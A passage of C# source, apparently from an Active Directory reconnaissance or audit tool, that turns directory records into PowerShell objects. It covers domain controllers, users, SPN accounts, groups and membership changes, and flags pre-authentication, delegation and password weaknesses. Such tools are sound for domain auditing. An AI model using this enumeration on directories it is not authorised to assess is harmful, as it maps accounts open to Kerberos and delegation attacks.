        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class DomainControllerRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    System.DirectoryServices.ActiveDirectory.DomainController AdDC = (System.DirectoryServices.ActiveDirectory.DomainController) record;
                    bool? Infra = false;
                    bool? Naming = false;
                    bool? Schema = false;
                    bool? RID = false;
                    bool? PDC = false;
                    string Domain = null;
                    string Site = null;
                    string OperatingSystem = null;
                    PSObject DCSMBObj = new PSObject();

                    try
                    {
                        Domain = AdDC.Domain.ToString();
                        foreach (var OperationMasterRole in (System.DirectoryServices.ActiveDirectory.ActiveDirectoryRoleCollection) AdDC.Roles)
                        {
                            switch (OperationMasterRole.ToString())
                            {
                                case "InfrastructureRole":
                                Infra = true;
                                break;
                                case "NamingRole":
                                Naming = true;
                                break;
                                case "SchemaRole":
                                Schema = true;
                                break;
                                case "RidRole":
                                RID = true;
                                break;
                                case "PdcRole":
                                PDC = true;
                                break;
                            }
                        }
                        Site = AdDC.SiteName;
                        OperatingSystem = AdDC.OSVersion.ToString();
                    }
                    catch (System.DirectoryServices.ActiveDirectory.ActiveDirectoryServerDownException)// e)
                    {
                        //Console.WriteLine("Exception caught: {0}", e);
                        Infra = null;
                        Naming = null;
                        Schema = null;
                        RID = null;
                        PDC = null;
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception caught: {0}", e);
                    }
                    PSObject DCObj = new PSObject();
                    DCObj.Members.Add(new PSNoteProperty("Domain", Domain));
                    DCObj.Members.Add(new PSNoteProperty("Site", Site));
                    DCObj.Members.Add(new PSNoteProperty("Name", Convert.ToString(AdDC.Name).Split('.')[0]));
                    DCObj.Members.Add(new PSNoteProperty("IPv4Address", AdDC.IPAddress));
                    DCObj.Members.Add(new PSNoteProperty("Operating System", OperatingSystem));
                    DCObj.Members.Add(new PSNoteProperty("Hostname", AdDC.Name));
                    DCObj.Members.Add(new PSNoteProperty("Infra", Infra));
                    DCObj.Members.Add(new PSNoteProperty("Naming", Naming));
                    DCObj.Members.Add(new PSNoteProperty("Schema", Schema));
                    DCObj.Members.Add(new PSNoteProperty("RID", RID));
                    DCObj.Members.Add(new PSNoteProperty("PDC", PDC));
                    if (AdDC.IPAddress != null)
                    {
                        DCSMBObj = GetPSObject(AdDC.IPAddress);
                    }
                    else
                    {
                        DCSMBObj = new PSObject();
                        DCSMBObj.Members.Add(new PSNoteProperty("SMB Port Open", false));
                    }
                    foreach (PSPropertyInfo psPropertyInfo in DCSMBObj.Properties)
                    {
                        if (Convert.ToString(psPropertyInfo.Name) == "SMB Port Open" && (bool) psPropertyInfo.Value == false)
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                            DCObj.Members.Add(new PSNoteProperty("SMB1(NT LM 0.12)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0202)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB2(0x0210)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0300)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0302)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB3(0x0311)", null));
                            DCObj.Members.Add(new PSNoteProperty("SMB Signing", null));
                            break;
                        }
                        else
                        {
                            DCObj.Members.Add(new PSNoteProperty(psPropertyInfo.Name, psPropertyInfo.Value));
                        }
                    }
                    return new PSObject[] { DCObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class SchemaRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdSchema = (SearchResult) record;

                    PSObject SchemaObj = new PSObject();
                    SchemaObj.Members.Add(new PSNoteProperty("ObjectClass", AdSchema.Properties["objectclass"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("Name", AdSchema.Properties["name"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenCreated", AdSchema.Properties["whencreated"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("whenChanged", AdSchema.Properties["whenchanged"][0]));
                    SchemaObj.Members.Add(new PSNoteProperty("DistinguishedName", AdSchema.Properties["distinguishedname"][0]));
                    return new PSObject[] { SchemaObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    string DelegationType = null;
                    string DelegationProtocol = null;
                    string DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    string SIDHistory = "";
                    bool? HasSPN = null;

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties["msds-supportedencryptiontypes"].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties["msds-supportedencryptiontypes"][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals("ab721a53-1e2f-11d0-9819-00aa0040529b"))
                            {
                                if (Rule.AccessControlType.ToString() == "Deny")
                                {
                                    string ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == "Everyone")
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == "NT AUTHORITY\\SELF")
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties["pwdLastSet"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) == "0")
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdlastset"][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if (AdUser.Properties["accountExpires"].Count != 0)
                    {
                        if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 9223372036854775807)
                        {
                            if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 0)
                            {
                                try
                                {
                                    //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                    AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties["accountExpires"][0]));
                                    AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                                }
                                catch //(Exception e)
                                {
                                    //    Console.WriteLine("Exception caught: {0}", e);
                                }
                            }
                        }
                    }
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        if ((bool) TrustedforDelegation)
                        {
                            DelegationType = "Unconstrained";
                            DelegationServices = "Any";
                        }
                        if (AdUser.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                        {
                            DelegationType = "Constrained";
                            for (int i = 0; i < AdUser.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                            {
                                var delegateto = AdUser.Properties["msDS-AllowedToDelegateTo"][i];
                                DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                            }
                            DelegationServices = DelegationServices.TrimStart(',');
                        }
                        if ((bool) TrustedtoAuthforDelegation)
                        {
                            DelegationProtocol = "Any";
                        }
                        else if (DelegationType != null)
                        {
                            DelegationProtocol = "Kerberos";
                        }
                    }
                    if (AdUser.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdUser.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdUser.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        HasSPN = false;
                    }
                    else if (AdUser.Properties["serviceprincipalname"].Count > 0)
                    {
                        HasSPN = true;
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", (AdUser.Properties["userworkstations"].Count != 0 ? AdUser.Properties["userworkstations"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", (AdUser.Properties["admincount"].Count != 0 ? AdUser.Properties["admincount"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", (AdUser.Properties["primarygroupid"].Count != 0 ? AdUser.Properties["primarygroupid"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties["objectSID"][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("HasSPN", HasSPN));
                    UserObj.Members.Add(new PSNoteProperty("Description", (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Title", (AdUser.Properties["Title"].Count != 0 ? CleanString(AdUser.Properties["Title"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Department", (AdUser.Properties["Department"].Count != 0 ? CleanString(AdUser.Properties["Department"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Company", (AdUser.Properties["Company"].Count != 0 ? CleanString(AdUser.Properties["Company"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Manager", (AdUser.Properties["Manager"].Count != 0 ? CleanString(AdUser.Properties["Manager"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Info", (AdUser.Properties["info"].Count != 0 ? CleanString(AdUser.Properties["info"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Logon Date", LastLogonDate));
                    UserObj.Members.Add(new PSNoteProperty("Password LastSet", PasswordLastSet));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration Date", AccountExpires));
                    UserObj.Members.Add(new PSNoteProperty("Account Expiration (days)", AccountExpirationNumofDays));
                    UserObj.Members.Add(new PSNoteProperty("Mobile", (AdUser.Properties["mobile"].Count != 0 ? CleanString(AdUser.Properties["mobile"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Email", (AdUser.Properties["mail"].Count != 0 ? CleanString(AdUser.Properties["mail"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("HomeDirectory", (AdUser.Properties["homedirectory"].Count != 0 ? AdUser.Properties["homedirectory"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ProfilePath", (AdUser.Properties["profilepath"].Count != 0 ? AdUser.Properties["profilepath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("ScriptPath", (AdUser.Properties["scriptpath"].Count != 0 ? AdUser.Properties["scriptpath"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("UserAccountControl", (AdUser.Properties["useraccountcontrol"].Count != 0 ? AdUser.Properties["useraccountcontrol"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("First Name", (AdUser.Properties["givenName"].Count != 0 ? CleanString(AdUser.Properties["givenName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Middle Name", (AdUser.Properties["middleName"].Count != 0 ? CleanString(AdUser.Properties["middleName"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Last Name", (AdUser.Properties["sn"].Count != 0 ? CleanString(AdUser.Properties["sn"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Country", (AdUser.Properties["c"].Count != 0 ? CleanString(AdUser.Properties["c"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenCreated", (AdUser.Properties["whencreated"].Count != 0 ? AdUser.Properties["whencreated"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("whenChanged", (AdUser.Properties["whenchanged"].Count != 0 ? AdUser.Properties["whenchanged"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("DistinguishedName", (AdUser.Properties["distinguishedname"].Count != 0 ? CleanString(AdUser.Properties["distinguishedname"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("CanonicalName", (AdUser.Properties["canonicalname"].Count != 0 ? CleanString(AdUser.Properties["canonicalname"][0]) : "")));
                    return new PSObject[] { UserObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class UserSPNRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    if (AdUser.Properties["serviceprincipalname"].Count == 0)
                    {
                        return new PSObject[] { };
                    }
                    List<PSObject> SPNList = new List<PSObject>();
                    bool? Enabled = null;
                    string Memberof = null;
                    DateTime? PasswordLastSet = null;

                    if (AdUser.Properties["pwdlastset"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) != "0")
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdLastSet"][0]));
                        }
                    }
                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                    }
                    string Description = (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "");
                    string PrimaryGroupID = (AdUser.Properties["primarygroupid"].Count != 0 ? Convert.ToString(AdUser.Properties["primarygroupid"][0]) : "");
                    if (AdUser.Properties["memberof"].Count != 0)
                    {
                        foreach (string Member in AdUser.Properties["memberof"])
                        {
                            Memberof = Memberof + "," + ((Convert.ToString(Member)).Split(',')[0]).Split('=')[1];
                        }
                        Memberof = Memberof.TrimStart(',');
                    }
                    foreach (string SPN in AdUser.Properties["serviceprincipalname"])
                    {
                        string[] SPNArray = SPN.Split('/');
                        PSObject UserSPNObj = new PSObject();
                        UserSPNObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? CleanString(AdUser.Properties["samaccountname"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                        UserSPNObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                        UserSPNObj.Members.Add(new PSNoteProperty("Service", SPNArray[0]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Host", SPNArray[1]));
                        UserSPNObj.Members.Add(new PSNoteProperty("Password Last Set", PasswordLastSet));
                        UserSPNObj.Members.Add(new PSNoteProperty("Description", Description));
                        UserSPNObj.Members.Add(new PSNoteProperty("Primary GroupID", PrimaryGroupID));
                        UserSPNObj.Members.Add(new PSNoteProperty("Memberof", Memberof));
                        SPNList.Add( UserSPNObj );
                    }
                    return SPNList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string ManagedByValue = AdGroup.Properties["managedby"].Count != 0 ? Convert.ToString(AdGroup.Properties["managedby"][0]) : "";
                    string ManagedBy = "";
                    string GroupCategory = null;
                    string GroupScope = null;
                    string SIDHistory = "";

                    if (AdGroup.Properties["managedBy"].Count != 0)
                    {
                        ManagedBy = (ManagedByValue.Split(new string[] { "CN=" },StringSplitOptions.RemoveEmptyEntries))[0].Split(new string[] { "OU=" },StringSplitOptions.RemoveEmptyEntries)[0].TrimEnd(',');
                    }

                    if (AdGroup.Properties["grouptype"].Count != 0)
                    {
                        var groupTypeFlags = (GroupTypeFlags) AdGroup.Properties["grouptype"][0];
                        GroupCategory = (groupTypeFlags & GroupTypeFlags.SECURITY_ENABLED) == GroupTypeFlags.SECURITY_ENABLED ? "Security" : "Distribution";

                        if ((groupTypeFlags & GroupTypeFlags.UNIVERSAL_GROUP) == GroupTypeFlags.UNIVERSAL_GROUP)
                        {
                            GroupScope = "Universal";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.GLOBAL_GROUP) == GroupTypeFlags.GLOBAL_GROUP)
                        {
                            GroupScope = "Global";
                        }
                        else if ((groupTypeFlags & GroupTypeFlags.DOMAIN_LOCAL_GROUP) == GroupTypeFlags.DOMAIN_LOCAL_GROUP)
                        {
                            GroupScope = "DomainLocal";
                        }
                    }
                    if (AdGroup.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdGroup.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdGroup.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject GroupObj = new PSObject();
                    GroupObj.Members.Add(new PSNoteProperty("Name", AdGroup.Properties["samaccountname"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("AdminCount", (AdGroup.Properties["admincount"].Count != 0 ? AdGroup.Properties["admincount"][0] : "")));
                    GroupObj.Members.Add(new PSNoteProperty("GroupCategory", GroupCategory));
                    GroupObj.Members.Add(new PSNoteProperty("GroupScope", GroupScope));
                    GroupObj.Members.Add(new PSNoteProperty("ManagedBy", ManagedBy));
                    GroupObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))));
                    GroupObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    GroupObj.Members.Add(new PSNoteProperty("Description", (AdGroup.Properties["Description"].Count != 0 ? CleanString(AdGroup.Properties["Description"][0]) : "")));
                    GroupObj.Members.Add(new PSNoteProperty("whenCreated", AdGroup.Properties["whencreated"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("whenChanged", AdGroup.Properties["whenchanged"][0]));
                    GroupObj.Members.Add(new PSNoteProperty("DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                    GroupObj.Members.Add(new PSNoteProperty("CanonicalName", AdGroup.Properties["canonicalname"][0]));
                    return new PSObject[] { GroupObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupChangeRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    string Action = null;
                    int? DaysSinceAdded = null;
                    int? DaysSinceRemoved = null;
                    DateTime? AddedDate = null;
                    DateTime? RemovedDate = null;
                    List<PSObject> GroupChangesList = new List<PSObject>();

                    System.DirectoryServices.ResultPropertyValueCollection ReplValueMetaData = (System.DirectoryServices.ResultPropertyValueCollection) AdGroup.Properties["msDS-ReplValueMetaData"];

                    if (ReplValueMetaData.Count != 0)
                    {
                        foreach (string ReplData in ReplValueMetaData)
                        {
                            XmlDocument ReplXML = new XmlDocument();
                            ReplXML.LoadXml(ReplData.Replace("\x00", "").Replace("&","&amp;"));

                            if (ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText != "1601-01-01T00:00:00Z")
                            {
                                Action = "Removed";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText);
                                DaysSinceRemoved = Math.Abs((Date1 - (DateTime) RemovedDate).Days);
                            }
                            else
                            {
                                Action = "Added";
                                AddedDate = DateTime.Parse(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText);
                                DaysSinceAdded = Math.Abs((Date1 - (DateTime) AddedDate).Days);
                                RemovedDate = null;
                                DaysSinceRemoved = null;
                            }

                            PSObject GroupChangeObj = new PSObject();
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group Name", AdGroup.Properties["samaccountname"][0]));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Group DistinguishedName", CleanString(AdGroup.Properties["distinguishedname"][0])));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Member DistinguishedName", CleanString(ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["pszObjectDn"].InnerText)));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Action", Action));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Age (Days)", DaysSinceAdded));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Age (Days)", DaysSinceRemoved));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Added Date", AddedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("Removed Date", RemovedDate));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeCreated", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeCreated"].InnerText));
                            GroupChangeObj.Members.Add(new PSNoteProperty("ftimeDeleted", ReplXML.SelectSingleNode("DS_REPL_VALUE_META_DATA")["ftimeDeleted"].InnerText));
                            GroupChangesList.Add( GroupChangeObj );
                        }
                    }
                    return GroupChangesList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdGroup = (SearchResult) record;
                    LDAPClass.AdGroupDictionary.Add((Convert.ToString(new SecurityIdentifier((byte[])AdGroup.Properties["objectSID"][0], 0))),(Convert.ToString(AdGroup.Properties["samaccountname"][0])));
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: {0}", e);
                    return new PSObject[] { };
                }
            }
        }

        class GroupMemberRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    // https://github.com/BloodHoundAD/BloodHound/blob/master/PowerShell/BloodHound.ps1
                    SearchResult AdGroup = (SearchResult) record;
                    List<PSObject> GroupsList = new List<PSObject>();
                    string SamAccountType = AdGroup.Properties["samaccounttype"].Count != 0 ? Convert.ToString(AdGroup.Properties["samaccounttype"][0]) : "";
                    string ObjectClass = Convert.ToString(AdGroup.Properties["objectclass"][AdGroup.Properties["objectclass"].Count-1]);
                    string AccountType = "";
                    string GroupName = "";
                    string MemberUserName = "-";
                    string MemberName = "";
                    string PrimaryGroupID = "";
                    PSObject GroupMemberObj = new PSObject();

                    if (ObjectClass == "foreignSecurityPrincipal")
                    {
                        AccountType = "foreignSecurityPrincipal";
                        MemberName = null;
